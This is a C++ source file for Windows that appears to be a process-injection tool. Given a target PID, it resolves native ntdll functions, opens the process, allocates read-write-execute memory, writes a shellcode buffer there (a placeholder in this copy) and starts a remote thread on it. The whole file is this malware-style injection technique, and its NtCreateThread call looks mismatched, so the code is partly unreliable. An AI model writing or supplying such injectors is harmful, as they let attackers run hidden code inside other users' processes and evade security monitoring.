#include <Windows.h>
#include <stdio.h>
#include "definitions.h"

int Error(const char* str) {
	printf("%s (%u)\n", str, GetLastError());
	return 1;
}

int main(int argc, const char* argv[]) {
	unsigned char shellcode[] = "\x41\x41\x41\x41\x41\x41";

	if (argc < 2)
	{
		printf("Usage: NT_RemoteThreadInjaction <PID>\n");
		return 0;
	}

	LPVOID allocation_start = nullptr;
	SIZE_T allocationsize = sizeof(shellcode);
	HANDLE hProcess, hThread;
	NTSTATUS status;
	
	OBJECT_ATTRIBUTES objattr;
	int pid = atoi(argv[1]);
	CLIENT_ID cid;
	InitializeObjectAttributes(&objattr, NULL, 0, NULL, NULL);
	cid.UniqueProcess = (PVOID)pid;
	cid.UniqueThread = 0;
	HINSTANCE hNtdll = LoadLibrary(L"ntdll.dll");


	_NTOpenProc NTOpenProc = (_NTOpenProc)GetProcAddress(hNtdll, "NtOpenProcess");
	_NTAllocVM NtAllocVM = (_NTAllocVM)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
	_NTWriteVM NtWriteVM = (_NTWriteVM)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
	_NtCT NtCT = (_NtCT)GetProcAddress(hNtdll, "NtCreateThread");

	allocation_start = nullptr;
	
	status = NTOpenProc(&hProcess, PROCESS_ALL_ACCESS, &objattr, &cid);
	if (!hProcess)
	{
		return Error("Failed to open process");
	}
	status = NtAllocVM(hProcess, &allocation_start, 0, (PULONG)&allocationsize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	status = NtWriteVM(hProcess, allocation_start, shellcode, sizeof(shellcode), 0);
	status = NtCT(&hThread, GENERIC_EXECUTE, NULL, hProcess, allocation_start, &allocationsize, FALSE, NULL, NULL, NULL, NULL);

	WaitForSingleObject(hThread, 5000);
	CloseHandle(hProcess);

	return 0;
}